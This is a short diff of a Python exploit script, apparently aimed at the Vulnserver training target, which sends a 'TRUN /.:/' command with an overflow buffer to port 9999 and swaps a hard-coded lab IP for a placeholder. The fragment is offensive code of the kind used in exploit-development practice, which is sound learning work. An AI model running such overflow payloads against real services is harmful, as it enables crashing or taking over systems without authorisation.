@@ -43,7 +43,8 @@ while counter <= 6000:
 '''
 try:
 	print(">>>>>.SENDIND EVIL.<<<<<")
-	s.connect(("192.168.100.4",9999))
+	#your ip address
+	s.connect(("IP add",9999))
 	s.send("TRUN /.:/ "+buffer)
 	print (">>>>>>..DONE..<<<<<<")
 except:
